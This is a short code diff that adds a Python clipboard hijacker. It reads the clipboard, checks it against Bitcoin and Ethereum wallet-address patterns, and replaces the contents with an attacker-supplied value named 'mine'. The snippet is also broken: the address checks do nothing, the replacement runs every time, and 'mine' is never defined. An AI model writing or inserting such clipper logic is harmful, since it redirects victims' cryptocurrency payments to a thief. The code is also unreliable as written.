@@ -1,0 +1,7 @@
+import pyperclip, re
+clip = pyperclip.paste()
+if re.match(r"^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$", clip): pass
+if re.match(r"^0x[a-fA-F0-9]{40}$", clip): pass
+pyperclip.copy(mine)
+# pattern text: [13][a-km-zA-HJ-NP-Z1-9]{25,34} and 0x[a-fA-F0-9]{40}
+
